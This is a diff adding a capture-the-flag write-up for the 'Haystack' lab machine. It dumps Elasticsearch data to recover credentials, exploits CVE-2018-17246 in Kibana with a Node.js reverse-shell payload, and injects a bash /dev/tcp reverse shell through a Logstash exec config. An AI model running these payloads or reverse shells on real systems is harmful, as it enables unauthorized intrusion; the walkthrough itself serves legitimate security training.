@@ -189,6 +189,114 @@ p.interactive()
 
 <p>(END)</p>
 
+<h1 id="haystack">Haystack</h1>
+
+<p>This machine has a strong relationship with elasticsearch.</p>
+
+<h2 id="user-1">User</h2>
+
+<p>Firstly, nmap it, you&rsquo;ll find 80 + 22 + 9200, which 9200 is a elasticsearch web API.</p>
+
+<p>Enum all indexes by accessing: <a href="http://10.10.10.115:9200/_cat/indices">http://10.10.10.115:9200/_cat/indices</a></p>
+
+<p>Get mapping from <code>quotes</code>: <a href="http://10.10.10.115:9200/quotes/_mapping">http://10.10.10.115:9200/quotes/_mapping</a></p>
+
+<p>Dump data from <code>quotes</code> using <a href="https://github.com/taskrabbit/elasticsearch-dump">https://github.com/taskrabbit/elasticsearch-dump</a> , also, this tool is using search API with scroll feature&hellip;</p>
+
+<pre><code class="language-bash">$ elasticdump \
+  --input=http://10.10.10.115:9200/quotes \
+  --output=/tmp/quotes_dump.json \
+  --type=data
+</code></pre>
+
+<p>After you get dumped data, run the following python script to extract all info.</p>
+
+<pre><code class="language-python">import json
+f1 = open(&quot;quote_index.json&quot;,&quot;r&quot;,encoding=&quot;utf-8&quot;).readlines()
+tmp2 = []
+for i in f1:
+    tmp00 = json.loads(i)
+    data = tmp00[&quot;_source&quot;][&quot;quote&quot;]
+    data += &quot;\n&quot;
+    tmp2.append(data)
+f2 = open(&quot;result.txt&quot;,&quot;w&quot;,encoding=&quot;utf-8&quot;)
+f2.writelines(tmp2)
+f2.close()
+</code></pre>
+
+<p>In result.txt, you should find two base64-encoded string, which included the username and password encoded in base64, decode them:</p>
+
+<pre><code>user: security
+pass: spanish.is.key
+</code></pre>
+
+<p>User flag get.</p>
+
+<h2 id="root-1">Root</h2>
+
+<p>Check: <a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></p>
+
+<p>Save the following code to /tmp/tjr1.js , then run the next shell command on the remote victim box.</p>
+
+<pre><code class="language-javascript">(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(33234, &quot;10.10.16.118&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+</code></pre>
+
+<pre><code class="language-bash">$ whoami
+security
+$ curl &quot;http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/tjr1.js&quot;
+</code></pre>
+
+<p><code>nc -lvp 33234</code>, Get a reverse shell as Kibana.</p>
+
+<pre><code>$ pwd
+/etc/logstash/conf.d
+$ cat ./*.conf
+filter {
+        if [type] == &quot;execute&quot; {
+                grok {
+                        match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
+                }
+        }
+}
+input {
+        file {
+                path =&gt; &quot;/opt/kibana/logstash_*&quot;
+                start_position =&gt; &quot;beginning&quot;
+                sincedb_path =&gt; &quot;/dev/null&quot;
+                stat_interval =&gt; &quot;10 second&quot;
+                type =&gt; &quot;execute&quot;
+                mode =&gt; &quot;read&quot;
+        }
+}
+output {
+        if [type] == &quot;execute&quot; {
+                stdout { codec =&gt; json }
+                exec {
+                        command =&gt; &quot;%{comando} &amp;&quot;
+                }
+        }
+}
+</code></pre>
+
+<p>Logstash collects unstructured data from log files and other sources, converts it into structured data, and inserts it into elasticsearch. According to the config, we build payload using this command: <code>echo 'Ejecutar comando : /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.118/33938 0&gt;&amp;1' &gt; /opt/kibana/logstash_sht2a</code></p>
+
+<p>Then access <a href="http://10.10.10.115:9200/*">http://10.10.10.115:9200/*</a> to let the elasticsearch refresh its data, then wait about 10s.</p>
+
+<p>You will get root shell with <code>nc -lvp 33938</code>.</p>
+
+<p>(END)</p>
+
       </article>
       <div id="disqus_thread"></div>
 <script type="application/javascript">
